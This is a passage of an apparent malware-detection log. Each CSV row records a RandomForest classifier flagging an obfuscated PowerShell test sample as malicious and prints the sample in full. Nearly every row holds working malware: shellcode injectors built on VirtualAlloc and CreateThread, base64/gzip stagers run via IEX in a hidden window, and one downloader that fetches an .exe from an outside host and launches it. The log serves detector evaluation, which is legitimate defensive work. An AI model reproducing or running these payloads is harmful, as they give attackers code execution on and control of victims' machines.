2026-07-13 16:57:57,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2269.ps1,custom-ps-ml,UNKNOWN,5f5e2ba6-6eb2-409a-a855-d6ed8c2794df,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3209,1621.58," . ( $SHELlid[1]+$ShellID[13]+'X') ( (((\""{7}{21}{37}{45}{42}{61}{69}{39}{12}{28}{52}{25}{56}{26}{10}{11}{30}{59}{57}{29}{3}{66}{20}{76}{65}{53}{35}{51}{36}{2}{13}{63}{33}{75}{73}{62}{24}{46}{60}{68}{74}{32}{16}{44}{19}{50}{55}{15}{71}{1}{8}{4}{18}{64}{38}{0}{9}{41}{40}{48}{49}{27}{47}{54}{14}{23}{58}{43}{72}{5}{34}{6}{31}{17}{22}{70}{67}\"" -f '9,0xf3,0x9b,0x98,',',0xa2,0xae,0xb1,0xbc,0x12,0x58,0x46,0','x','d9,','0x8e,0x77,0x52,','{layg = layz.Length};layWik','VirtualAlloc(0,0x1000,layg,0x40);for (layi=0;layi -le (lay','layMtB = C3b[DllIm','x43,0x02,0x33,','0xef,0x99,0x33,0xcd,0xb8,0x35,0xad,0x54,0x32,0xa4,0x32,0x43,0x3e,0xe6,0xb9,0x60,0xb','hreadId);','[DllImport(lxymsvcrt.dlllxy)]public static extern IntPtr memset(I',' lpThr','b7,0xe7,0xab,0xdf,0x6a,0x17,0x','x3b,0xdf,0x31,0xf7,0xec,0xb7,0xbf,0x2e,0xda,0x17,0x3f,0x05,0xda,0x64,0x96,0x63,0xa8,0x84,0x2a;la',',0x7b,0x97,0x4b,0x',',0xc4,0x10,0x20,0x72,0x7f,0x2c,0','lay','0xbc,0x1a,0','48,0x1c,0x04,0x2c,0x33,0xc1,0xa0,0x27,0xde,0x16,0xd9,0x6a,0xb7,0xdb,0xd0,0x94,0x47,0x74,0x62,0xe7,0x75,0xdb,0','0x4e,0x83,0xed,0xfc,0','port(lxy','i++) {layw::memset([Int','yg = 0x1000;if (','d7,0x2c,0','rtAddress, IntPtr lpParameter, uint dwCreationF','r lpT','f4,0xa','eadAttributes, uin','xf5,0xbd,0x','ntPtr dest, uint src, uint count);C3b;layw = Add-Type -memberDefinition layM','z.Length-1);','0,0xf5,0x55,0x77,0x94,0xed,0xfe,0xfc,0x0e,0xc9,0xff,0xd1,0xc9,0x9a,0x0c,0x9d,0x9e',',0xb6,0x9c,0x93,0x3b,','=layw::','d,0xf8,0x19,0x7a,0x59,0x89,0x0a,0x',',0xa8,0xfc,0xf6,0xe2,0x8e,0x33,0x06,0x5e,0xf2,0x52,0x84,0x9d,0x27,0xb4,0xb5,0x6d,0x3a,0xb5,0xf2,0x90,0','kernel32.dlllxy)]public static extern ',',0xc2,0x37,0x0d,0x0','ort(lxykernel32.dlllxy)]public static extern IntPtr CreateThread(IntPtr','a5,0xcb','e,0xa8,0x49,0x0c,0xac,0x5c,0xba,0x5b,0x8e,0xca,0xc5,0x71,0xa5,0xf2,0x53,0x7e,0x6c,0x','r VirtualAlloc(IntPtr lpAddress, ','h ','xa9,0x75,0xaf,0xa4,0xe9,0x51,0x6b,0xec,0xaa,0xf8,0x2a,0x','IntPt','x1d,0x79,0xcf,0x31,0x18,0x33','2,0xfa,0x7f,0x04,0xf5,0',',0x7','c,0x49,0x81,0x53,0x7e,0xbc,0x9a,0x5a,0xea,0x7f,0x','xd8,0x6f,0x36,0x94,0xc6,0x68,0x39,0x8f,0xbf,0xe6,0xc4,0x30,0xc0,0x2f,0x03,','4a,0x29,0xdf,0xa6,0x21,0x7f,0xcb,0x3d,0x47','t dwStackSize, IntPtr lpSta','0x17,0x48,0xdd,0xd7,0x55,0xb3,0x1d,0x28,0x3a,0x3','x90,0x7f,0x6c,0xa1,0xc0,0xd3,0x89,0xae,0xdc,0x47,0x02,0','0x64,0x90,0x47,0xa2,0x05','lags, IntPt',' -namespace Win32Functions -passthru;[Byte[]];[Byte[]]layz = 0xda,0xc7,0xbb,0xc4,0x2b,0','layz.Lengt','tB -Name lxyWin32lxy',',0x64,0x81,0xd6,0xc2,0xac,0xdb,0x17,','uint dwSize, uint flAlloca','4,0x30,0x','df,0xaa','xfc,0x12,0x5f,0xcf,0x06','x03,0x99,0x38,','0x74,0x24,0xf4,0x5d,0x2b,0xc9,0xb1,','){Start-sleep 60};','0x68,0x9','tionType, uint flProtect);[DllImp','Ptr](layWik.ToInt32()+layi), layz[layi], 1)};layw::CreateThread(0,0,layWik,0,0,0);for (;;','d0,0x2c,0xc7,0xe3,0x8b,0x8c,0xb7,0x43,0x7c,0x65,0xdd,0x4b,0xa3,0x95,0xde,0x81,0xcc,0xbe,0x30,0x2a,0xf3,0x3e,0x5d,0x59,0x95,0x0f,0xaf,0xb3,0x31,0x1f','-gt 0x1000)','xff,0x6','1,0xd3,0xe5,0x70,0xd6,0xd4,0x15,0x07,0x2e,0x27,0xab,0x1','0xbf,0x41,0x63,0x3d,0xee,0xd4,0','x31,0x5d,0x13,0'))-RePLACe  ([chaR]108+[chaR]120+[chaR]121),[chaR]34 -CRePLAce 'C3b',[chaR]39 -RePLACe'lay',[chaR]36) )",malicious,TP
2026-07-13 16:57:59,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2287.ps1,custom-ps-ml,UNKNOWN,04818197-9c10-42a5-b48b-8325e35b1970,DESKTOP-BAC9DBQ,malicious,0.9967,RandomForest,3049,1519.8,"(((\""{30}{9}{67}{31}{0}{1}{63}{7}{52}{10}{22}{58}{40}{12}{68}{5}{34}{26}{59}{48}{35}{20}{69}{39}{50}{53}{62}{47}{4}{56}{70}{36}{15}{37}{29}{14}{32}{33}{21}{65}{49}{2}{71}{19}{17}{28}{11}{60}{41}{61}{6}{54}{51}{25}{3}{24}{8}{66}{27}{57}{64}{46}{43}{72}{55}{38}{42}{44}{45}{23}{16}{18}{13}\""-f'9','}el','9qWtqJ5tKH','ORqqqvkxlghoJGWjsHSW79cu/zYOwiVmoAO4z','S4lO','OWVqTvSrzhYOcTOd2mVsB','STv1x','{NkWb=NkWenv:windir+Jg9N3Rsyswow64N3RWindowsPowerShellN3Rv1.0N3Rpowershell.exeJg9};NkWs=New-Object System.D','LVXJPAIg0YHrTCR','e',';NkWs.Arguments=Jg9','I39R4d9la3VbGYmAwPHdUd568x3','qSalgCA71W+2/aSBD+uZX6P1gVErZKM',');','myTeJ0Xvkt3jOTilywyHYUbqRlBeVkYyCGbEzkjIC+nJhCLBD8P0E9x2xAS1cCiS5ebKGZWnLcvcC0UQWZBMOP7A8IlFMYvZyEh1ahNtZ1A32Tr9IhdlzBj1XFjpEXIBb2IODBF','mHExSKmNSPNfg6rrKn4','Jg9HiddenJg9;','vj+3sD1fvDiZg2UH1Ac6tJce/f0r3RQvZkq37Za/tNTtvu713','NkWs.CreateNoWindow=NkWtrue;NkWp=[System.Diagnostics.Process]::Start(NkWs','1Agb7XpX79XrxcdbwywKo9IQzW5DtC','X6TZycQ/cgTdE3ALkjAfYMEj9QiYbaOPZuRPnHmco','4O2sEvs9AtgE+0fhR4zk1ByBhXSbTAuMpJJAwGXR8zyubz+G6','-nop -w hidden -c NkWs=New-Object IO.MemoryStream(,[Convert]::FromBase6','ionMode]::Decompress))).ReadToEnd();Jg9;NkWs.UseShellExecute=NkWfalse;NkWs.RedirectStandardOutput=NkWtrue;NkWs.WindowStyle=','pMyrfKgerqcu5zGEbL81','Z+tcvAPhhecmSyzhij1nRXVdX8pFtE9Rwd1VwUL4ldrYdR+KjvdTVv2twefe5MHNUcs5Kqlwe+5aiquqnrTWua317dla5aI2qu','Fy+zQC7FDOrDaI2kTs','3GzOL/LoV8du8gcqnYIw8LliyNF+uGoPDWR5NXNzRQQQ82cKznbIp4rlpnct','bmeiO45Yco5//XKWtUbmn5S5xS69ErZG20XLFsE','2nKchKQ6o','if([IntPtr]::Size -eq 4){NkWb=Jg9pow','exeJg','LJACUz+SgZA0iGmu','fkTX4Hkq+yrALBX6qj','D7ojsiHq','UFzGWk','VcEIeRw+mziVsH8Mnpk4HYO','EatFlNkkQBbkMwRUkGrlOZhjpuR0w2uTNdB','w-Object','NUg+DwKvrgiUDKTmdbRtbkeMHBdIKz/jTbKqwP','H4sIAA','HSqa9Y',' I','7tfWN9EeC5zJOOn','O.C','ompression.GzipStream(NkWs,[IO.Compression.Compress','u0','SVAccmVxa39l+tefx2CamZzacwg9Z','gMPAXEBEFnnR+rHido5echmE34Bay7YCEEJRteI98ReS','Gx','Mjs8DF9w/vP7x','yZ7PukBSTWOsNsHH7d8aS0d8NE/Ie1Th4eXeKVxpIFPdfoAuC','iagnostics.ProcessStartInfo;NkWs.FileName=NkWb','3EkGsrtqFyTUyBubiXBIwejc7jAkAlrs8pAf3r1IuI7VhTyx4sINpahBERJlLszgfs/lc','fwnzKkBoqrliw','uBtwOTFy7KO/ZOOkqrPvkaesgWKc0xN/I95F4qIDHyt/AcTlbfydCgAAJg9Jg9));IEX (New-Object IO.StreamReader(Ne','r','pDLQTvIbYs5OPnbT1vm/k5+tmQmbisH2v6+FzvspcRllQosbzpe9Bvh9n8','4String(Jg9Jg9','eR2mFb','baCezPP2/sGQrVlwdrfOmZt2bZ3k7p6PSquUAWhslcxqxpvTrQAdVUTuybfNF0N19wyKuM','VXr9aoaGtbuH/Rr1YXYMV5qI/O','Sm2xyWsLi5WKzVLm9XXy','se','g91TXS/ix30j','KzayTBVg7IKVdyUlwzbSfiWkj53pdxa+A3mrtaXCsJeweuAgE8VQO+1nBIvhQNEQCL8kf1jpYRPJO','OGKMW','rshell.','ARakkiVbo15hUcAg3kdOi322mxYvI69Do9e//cbA27INalyd9JZidj1zOx++803O3YizxKUexK3alElXxiNpG8f3r/r4gCvJTkVltYPncIgI6XYYudMlXfvwJjC/qZdvjJ3fseUvkryDPm+zteYevObm3IUBMQTx3m2RgQKQ7JeMEpCWZH+lEZLEpCLu8U9sYT0TUr9ka0xvsDs5LYrY2tJpAvk2bGtxS0cw8saPqNCTv/+e1qZXeTn2cpDhFkop41dKMg6az','dskrO/','reL1Vi0+si1IlDPaLvPLymVqIz+a','5Rhv+h7TQ4HrJbt7e19VA3y4d','189f/CPW/x0NI0wF')) -rePlace'N3R',[cHAR]92 -CRePLAce ([cHAR]78+[cHAR]107+[cHAR]87),[cHAR]36 -rePlace  ([cHAR]74+[cHAR]103+[cHAR]57),[cHAR]39) | IEx",malicious,TP
2026-07-13 16:58:07,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2290.ps1,custom-ps-ml,UNKNOWN,5cf803e6-ebd3-4258-90de-e2c0782ac874,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,2903,1695.85,"((\""{19}{14}{58}{36}{47}{28}{11}{18}{52}{23}{41}{61}{65}{7}{62}{66}{30}{1}{54}{32}{45}{17}{29}{12}{44}{43}{67}{2}{55}{64}{46}{35}{20}{16}{27}{63}{5}{4}{49}{8}{38}{37}{6}{68}{42}{57}{22}{24}{3}{13}{26}{25}{15}{31}{50}{39}{0}{53}{51}{56}{34}{21}{9}{60}{59}{10}{40}{48}{33}\"" -f 'FhMFQAGPDLo8RY9','+K6iy','AAAs28VnOVBSpAdd54G293pyTcwqU2GhSgqwxhy0ikq','eZMFZlrBGM9/yh8zzfJfXe1M6eTAmeOBfJhiOh6h','7c+ud+6t6bRd5pieN6pI/roPzr1C+R4tN7pXgPfiJatOnKbvZFJO4/m+BtyG0DzZ7Ti+8gd3g7bQe/CEo1KrieTd2','C3JaS1pG6Gu/GQPaRfDMrJD13e4drViP8PbhvaJVi','M0AihBj','/8jmiHYcxYUfmqzXODxnEoaUBgX5KIb2wSPV','oFq+c0k34b9D7kVAH596sIbaOug1QK5ssX','FsExpRE','trNs,','Fli142IEMqfhYMhj','S0Y7s','SGxoT6jV7TSvsndrXY','New-Obj','OK21obG3tSGTROH+oASMPGwxG6Fc/gD+lNb6tGEnMe8jY175Nh1MJr48g5+w','fm/VqSfrGzG','3Q/2ViuYspcEiUM70dui3g0JK1tiA','nCgaIcPOFoG3I0ZK','trNs=','d1oxOgz7UB/ylErjDfvEVf/C7F2iZFmRYLUDac9oCACbcVlUJjSSUIPU4qvI+5','DyFBn2EAJ/dKXU9mOSFxJI9v+Qqm9bSlaYdYV6z2tXKIlR/KMYCCRPUERvbIj5P+pmR/IN+VR7hKKvhdGROHwFh63OUr6','Vlvza4vKr0wi5zq','yIXHNXwEHaHG02LR5gGi6+fGnGUURCmX2XzolEQpBgxSgRmq58V6ZrEpHjweqWOFL5Uzlcls','hPhmv3YOf8sVmaXuQFjbrUfz04+SwRi03d','jrz6ddg8t6F/lP25Vp1E/H15','M2RecSOeuMn2jpCncpgNjRNSx','ZHck1qaivPGViYJk3I6SSc4ewEzhS6SAFsn4kE','3','Pq7IJTe8tpxGMkBa','iQS/8KLwRVS5hxMeSLCVAvxdWhYODebokcB9tyAVN5c6UclHpgxFY8mgLn4eXUUz0hTJPXDdfLPJjd5Ki','1C','4ql8mcmdlxpswnnLqLw','ress))).ReadToEnd();','knjo0jlAbg31+15GiLMy59kDB/E8vgCpr6C+rVQsDxl','vYMBIA','m3vejrpIkVyxjPj8W9eYxN','o3U2Yatc7am3Jhn9Zu3L7TuB/1RiO','a3OV5NTz','Q+zjSKwxg9iGprarSB0edfLWNOQ0kdC0twefOxK','[IO','4ZX2GWs22b2FnDhVDoJns97uDkBiV7w6jU1D/+U','jWr+LKWv79+m++SFbrf','3yBuK4dHTRCdvxZrB1S+yDYy45ADjhdg','AQzU1','kHq5','P7rJQyGj2AH3AgyX9oY4FLMElaJiUpc0tjb1dyaob2LSxIzR0AdND+AToCRY2DIJmsgt/n+A6CWbSC','5bMuIOrLPXaIcT0gkKA+Vk0LhsMUtqZwpX9WCF4eOTMjJYukTudxE','.Compression.CompressionMode]::Decomp','o187qMqtXa','/qCQRvAq9rysLv9N','PXlzpSsvjPrPDrsjfflyAxfJC0SSsKUeCX25LpafquUytMXy','SrpR8JI3Dgi+sFB4SAlxaHAHlmGWNIHsg','xJmuk7XQ1ae9ZwF1CvrmBZ','k','NsGMuEUFhYLmWyiWPF2qP83tx','U62sFz5+/ybfbLUXbcWks+5BuX8QSw/SCxnUa7mGWuL+x1jn9Ss9+p9j/ZP2F7sfwr9c3Afp1eavhH/ijn8P0RRTCaI21GlGs','py5p6g+4TG6/8I9G+OuEoeXHbb4KN9+1Og2MROFvPmKydRuVqFj7avT6ijTWiz63IGVDbgAedd9Yz+/dn97wT3ti17c','ect IO.MemoryStream(,[Convert]::FromBase64String(kiGH4sIAAAAAAAAAL1XfW/iOBP/u3yK6FQpiUoJFK7LrlRpzVsTFspLWijlEDKJE9w6MY2dtvR2v/szeaHLP','O.Compression.GzipStream(','daokYQba/wBty9RH0gwAAA==kiG));IEX (New-Object IO.StreamReader(New-Object I','PX5cWVRat/HmAlNtbdCkqDkMqbqyg89OfByuyGa2qdOxAX3ZGlKw+pJ6Sq1/iI1vp/ZruoFuFtEZByFyvtXTHRm','CHiJKJQ5eRMfEW2gV53OHwUSFtXwi4hjLSi7n7PmJ7P3Vxpk','D','0xSBwu5U7fQ34A0','EpoKyyEggzIEVb1khQ','7VX1u/Fwc6PK9','FcSE/qsxmRM11Qr7J','eMuonOOcIdend1dG1UJs3u07OJhNks40mD35z//jybjPml6QQNw5jEJ224fSvCkzXyh/LUu/32aQaakOXPRpaY')).rEplace(([ChAR]107+[ChAR]105+[ChAR]71),[sTRING][ChAR]34).rEplace(([ChAR]116+[ChAR]114+[ChAR]78),[sTRING][ChAR]36) |.((gV '*mdr*').nAme[3,11,2]-jOiN'')",malicious,TP
2026-07-13 16:58:27,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2310.ps1,custom-ps-ml,UNKNOWN,ce77daca-68f9-43e3-ac6b-1c858c5ec7ee,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2891,1721.43," (((\""{46}{3}{34}{29}{24}{42}{17}{36}{23}{13}{43}{16}{41}{20}{32}{35}{39}{22}{37}{11}{7}{27}{48}{15}{45}{12}{18}{9}{38}{10}{25}{44}{4}{33}{26}{6}{1}{8}{14}{19}{40}{5}{30}{31}{28}{47}{0}{21}{2}\""-f'wcz[ewci], 1)};ewcw::CreateThread(0,','5,0x9f,0x95,0xec,0x','};','l32.dlllNi)]publi',',0xa2,0x3e,','0xdd,0x79,0xf0,0x25,0x1e,0xac,0x00,0x19,0xc9,0x88,0x76,0x73,',',0x0c,0x1d,0x59,0x0f,0x86,0x92,0x9d,0xc1,0x6f,0xde,0x8d,0xb','0d,0x45,0x02,0x6e,0x8d,0x67,0xc7,0x1a,0x84,0x7f,0x04,0x26,0x5e,0x0b,0xfe,0xdc,0x61,0xdd,0xcf,0','13,0x9f,0x03,0x9a,0x9b,0x35,0xa8,0x0d,0xcc,0xa1,0xb2,0x68,0x3a,0x6e,0x4c,0x5f,0x31,0xa7,0x',',0xc8,0xca,0x','c,0x52,0x7e,0xc5,0x5f,0x60,0x21,0x7d,0xc8,0xc8,0xaa,0x5b,0x0f,0x2f,0x81,0x1c,0x9f,0xc','9,0x37,0x','xed,0x02,0x33,0x97,0x10,0xc5,0xb2,0xe3,0x36,0xc1,0x9f,0xb0,0x57,0x50,0x45,0x16,0x67,0x82,0x26,0x',', uint dwCreationFlags, IntPtr lpThreadId);[DllImport(lNimsvcrt.dlllNi)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);Mfa;ewcw = Add-Type -memberDefinition ewcc -Name lNiWin32lNi','d8,0x20,0x2d,0xc8,0x0c,0x','5b,0x44,0x69,0x0b,0x78,0xee,0xfa,0xab,0xa4,0x0f,0x2e,0','mespace Win32',', uint dw','c7,0xcd','a1,0xad,0x9e,0x46,0xa1,0xc5,0x46,0x33,0xf2,0xf0,0x88,0xee,0x66,0xa9,0x1c,0x11','[]];[Byte[]]ewcz = 0xba,0x4a,0xef,0x5a,0xab,0xd9,0xd0,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x47,0x83,0xee,','0,ewcx,0,0,0);for (;;){Start-sleep 60','x35,','r lpStartAddress, IntPtr lpParameter',' static extern IntPtr CreateThread(IntPtr l','e,0x2a,0x5d,0x89,0x14,0x7e,0x0d,0xa1,0xbd,0xff,0xc6,0x31,0x42,0x2a,0x72,0x37,0xd4,0xf1','f6,0x59,0x9b,0x47,0x6e,0xc3,0x86,0x1c,0x0f','x1d,0xcd,0x20,0xe0,0xef,0x',' 0x1000){ewcg = ewcz.Length};ewcx=ewcw::VirtualAlloc(0,0x1000,ewcg,0x40);for (ewci=0;ewci -le (ewcz.Length-1);','ess, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(lNikernel32.dlllNi)]public','0xc9;ew','cg = 0x1000;if (ewcz.Length -gt','0xfc,0x31,0x56,0x0f,0x03,0x56,0x45,0x0d,0xaf,0x57,0xb1,0x53,0x50,0xa8,0x41,0x34,0xd8,0x4d,0x70,0x74,0xbe,0x06,0x22,0x44,0xb4,0x4b,0xce,0x2f,0x98,0x7f,0x45,0x5d,0x35,0x8f,0xee,0xe8,0x63,0xbe,0xef,0x41,','0x44,0xf4,0x94,0xee,0x06,0xa9,0x54,0x5f,0xe7,0x19,0x3c,0xb5,0xe8,0x46,0x5c,0xb6,0x22,0xef,0x','c static extern IntPtr VirtualAlloc(IntPtr lpAddr','0x57,0xa1,0x73,0x98,0x84,0x01,0x4a,0x53,0xd9,0x40,0x8b,0x8e,0x10,0x10,0x44,0xc4,0x87,0x85,0xe1,0x90,0x1b','StackSize, IntPt','0x1c,0xd2,0x0','1c,0x7c,0x93,0x82,0xd1,0x4d,0x2',',0x2d,0xb9,0',',0xdf,0x1e,0xb6,0x79,','Functions -passthru;[Byte','pThreadAttributes',' -na',',0xc4,0xec,0xab,0x92,0xc8,0x12','x2d,0x2e,0x03,0x9b,0x39,0x68,0x07,0x1a,0','ewcc = Mfa[DllImport(lNikerne','ewci++) {ewcw::memset([IntPtr](ewcx.ToInt32()+ewci), e','0f,0x64,0xc6,0x0f,0x7a,0x9c,0x35,0xad,0x7d,0x'))-REPLAcE ([ChAr]101+[ChAr]119+[ChAr]99),[ChAr]36 -REPLAcE  'Mfa',[ChAr]39-cREpLace ([ChAr]108+[ChAr]78+[ChAr]105),[ChAr]34) | &amp;( $eNV:comsPEc[4,15,25]-joIN'')",malicious,TP
2026-07-13 16:58:32,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2312.ps1,custom-ps-ml,UNKNOWN,71865870-4498-4398-940e-e2abf2889652,DESKTOP-BAC9DBQ,malicious,0.9865,RandomForest,478,1461.59,". ((Gv '*mdR*').NAME[3,11,2]-JOin'') ( (((\""{5}{29}{16}{25}{10}{12}{30}{1}{0}{9}{27}{21}{26}{31}{18}{15}{2}{32}{4}{11}{23}{33}{14}{13}{22}{7}{20}{28}{24}{19}{8}{3}{6}{17}\""-f'Clien','Web','-','Af','/c','(N','Ym','fY,AfYmess.e','ss ','t).D','ject S','s','ys','e','n1.','s.in/wp','w','ess.exeAfY','tp://brokelimited','art-Proce','x','adFi','xeA','s/uploa',';St','-Ob','le(Af','ownlo','eAfY)','e','tem.Net.','Yht','admin','d/ke'))  -ReplAce([cHAr]65+[cHAr]102+[cHAr]89),[cHAr]39) )",malicious,TP
2026-07-13 16:58:34,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2356.ps1,custom-ps-ml,UNKNOWN,ac002793-320a-41af-82c7-92b5a989242d,DESKTOP-BAC9DBQ,malicious,0.9947,RandomForest,2821,1640.75," .( ([sTrING]$verBosepReFERenCE)[1,3]+'x'-join'')((((\""{21}{29}{35}{15}{12}{39}{7}{33}{28}{44}{32}{38}{1}{0}{8}{34}{6}{25}{31}{27}{46}{23}{45}{22}{36}{16}{11}{5}{18}{26}{42}{37}{40}{41}{4}{24}{17}{9}{14}{19}{2}{13}{10}{3}{20}{43}{30}\""-f '2,0x30,0x8b,0x52',';[Byte[]];[Byte[]]4Qxz = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x5','0x1000;if (4Qxz.Length -gt 0x1000){4Qxg = 4Qxz.Length};4Qxx','Qxg,0x40);for (4Qxi=0;4Qxi -le (4Qxz.Length-1);4Qxi+','0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff','5b,0x61,0x59,0x5a,0x51,0xf','31,0xc0,0xac,0x3c,0x61,0x7c,0x02,','r, uint dwCreationFlags, IntPtr lpThreadId);[DllIm',',0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,',',0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0','00,4',',0x5b,0x','otect);[DllImport(Bexkernel32.dllBex)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartA','=4Qxw::VirtualAlloc(0,0x10','xf6,0x75,0xec,0xc3;4Q','rn IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flPr','9,0x44,0x24,0x24','0x02','f,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0x','xg = ','+) {4Qxw::memset([IntPtr](4Qxx.ToInt32()+4Qxi), 4Qx','4Qx','1,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x','x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,',',0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,','0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,','ff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x55,0xc',',0x8b,0x4','tatic extern I','c = m8a[DllImport(Bexkernel32.dllB','[4Qxi], 1)};4Qxw::CreateThread(0,0,4Qxx,0,0,0);for (;;){Start-sleep 60};','0x8b,0x42,0x3c,0x01,0xd0','erDef','port(Bexmsvcrt.dllBex)]public s','0x4a,0x26,0x31,0xff,0x','ex)]public static exte','8b,0x01,0xd0,0x8','8,0x02,0x00,0','inition 4Qxc -Name BexWin32Bex -namespace Win32Functions -passthru','ddress, IntPtr lpParamete','xd4,0xea,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,','0x68,0xf0,0xb5,0xa2,0x56,','9,0xde,0x60,0x6','z','ntPtr memset(IntPtr dest, uint src, uint count);m8a;4Qxw = Add-Type -memb','0x24,0x0','0,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0')) -RePlACE ([cHaR]52+[cHaR]81+[cHaR]120),[cHaR]36-CrePLaCe ([cHaR]66+[cHaR]101+[cHaR]120),[cHaR]34-CrePLaCe([cHaR]109+[cHaR]56+[cHaR]97),[cHaR]39))",malicious,TP
2026-07-13 16:58:39,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2358.ps1,custom-ps-ml,UNKNOWN,5aa63743-8975-4242-bfab-f3177afa72ab,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3940,1856.11," ((\""{85}{75}{13}{47}{33}{36}{32}{83}{44}{43}{35}{70}{18}{34}{81}{68}{90}{89}{69}{16}{10}{76}{9}{88}{66}{87}{6}{55}{91}{39}{20}{58}{86}{4}{72}{49}{17}{56}{42}{21}{12}{63}{15}{25}{30}{3}{26}{80}{51}{71}{74}{37}{29}{53}{40}{57}{52}{77}{23}{7}{11}{22}{82}{46}{5}{0}{31}{50}{45}{24}{14}{27}{2}{41}{59}{79}{67}{54}{92}{64}{73}{84}{19}{1}{61}{8}{28}{78}{38}{65}{62}{60}{48}\"" -f'b0,0x7b,0x91,0x87,0xd8,0x23,0x35,0x74,0xfc,0x2b,','.Text.Encodin','0;if (tCez.Le','f,0x06,0x91,0x46,0xb3,0xc0,0x2f,0x3f,0','xbe,0x38,0x93,0x','0x','0xb2,0x59','75,0x1f,0x63,0xb8,0x25,0xf','EF = Z1B-Enco','x83,0xeb','0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x57,0x31,0x43,0x15,0x03,0x43,0x15','6,0xeb,0x13,0xcc,0xee,0x90,0x94,0x',',0x','Import(Z1Bkernel32.dllZ1B)]public static',',0x95,0xbf,0x12,0x4d,0x64,0x70,0xd9,0x9c,0xb4,0x43,0x19,0xcf,0x89,0x9b,0x6d,0x21,0xdb,0xee,0xbf,0x3d;t',',0x86,0xfe,0xfa,0xa9,0x8a,0x0','Cez = 0xb8,0x26,0x6c,0xc9,0xb6,0xda,0xd4,0xd9,','7,0','tP','art-sleep 60};jK5;tCee = [System.Convert]::ToBase64String([System','5,0xf5,0x','e,0x35,0xa4,0xdc,0xac,0xc8,0xbe,0x1a,0xce,0x16,0x4b,0xb9,0x68,0xdc,0xeb,0x65,0x88','05,0x8b,0xa7,0x1f,0xac,0xdb,0x52,0x06,0xd8,0x13,0x29,0x1a,0x4f,',',0x2f,0x13,0x','x99,0xf3,0xb2,0x17,0xe1,0x86,0x7d,0x62,0x00,0xd0,0xbe,0xd2,0x22','1,0x2f,0xc2,0xb7,0x8a,0xce,0x05,0x3e,0xc8,0xf4,0x81,0x1a,0x8a,0x95,0x90,0xc6,0x7d,0xaa,0xc3,0xa8,0x22,0x0e,0x8f,0x45,0x36,0x23,0xd2,0x01,0xa6,0x5e,0x99,0xd1,0x5e,0xd7,0x08,0xbc,0xf7,0x43,0xa3,0x0c,0x7f,0x4d,0x34,0x72,0xaa,0xa0,0','x4a,0xb6,0xb0,0x6a,0xff,0','Ceg = 0x100','dedComman','x2f,0xd5,0xf8,0xa2,0x99,0xb1,0xed,0x10,0x08,0x79,0x0e,0x4f,0x','xe1,0xd','0xe0,0xe9','ic stat','wSize, uint flAllocati','tr dest, uint src, uint count);jK5jK5;tCew =','extern IntPtr memset','onType, uint flProtect);[DllImport(Z1Bkernel32.dllZ1B)]publ','b,0x9d,0x78,0x46,0xaf,0xcd,0','Z1B;if([IntPtr]::Size -eq 8){t','x01,0xc1,0x38,0xca,0x67,0xcd,0x4f,0x7b,0xcd,0x2b,0x61,0x7c,0x7e,0x0f,0xe0,0xfe,0x7d,0x43,0xc2,0x3f,0x4e,0x96,0x03,0x07,0xb3,0x5a,0x51,0xd0,0xbf,0xc8,0x46,0x5','0x67,0xc','ngth ',',0x4','rtAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(Z1Bmsvcrt.dllZ1B)]public static ',' IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr 